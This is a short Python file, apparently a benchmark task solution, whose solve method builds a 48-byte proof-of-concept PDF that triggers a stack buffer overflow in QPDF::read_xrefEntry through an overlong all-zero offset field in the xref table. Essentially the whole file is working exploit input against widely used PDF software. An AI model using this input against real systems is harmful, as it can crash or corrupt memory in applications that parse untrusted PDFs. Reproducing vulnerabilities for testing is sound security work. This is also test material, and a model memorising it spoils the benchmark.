import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the stack buffer overflow in QPDF::read_xrefEntry.
        
        The vulnerability is triggered by an overlong f1 or f2 entry consisting only of zeros
        in the xref table, specifically when validation for the first end-of-line character is missing.
        
        Target length: 48 bytes.
        
        Structure:
        1. PDF Header: "%PDF-1.0\n" (9 bytes) - Required for valid PDF detection
        2. Xref Header: "xref\n0 1\n" (9 bytes) - Start of xref table, object 0, 1 entry
        3. Entry: "00...00 00000 f" (30 bytes) - Overlong f1 field (22 zeros)
        
        Total: 9 + 9 + 30 = 48 bytes.
        """
        pdf_header = b"%PDF-1.0\n"
        xref_header = b"xref\n0 1\n"
        # 22 zeros for f1 (offset), 1 space, 5 zeros for f2 (gen), 1 space, 'f' type
        # Line length: 22 + 1 + 5 + 1 + 1 = 30 bytes
        # This overflows standard small buffers (e.g., 20 bytes) allocated for xref entries
        xref_entry = b"0" * 22 + b" 00000 f"
        
        return pdf_header + xref_header + xref_entry
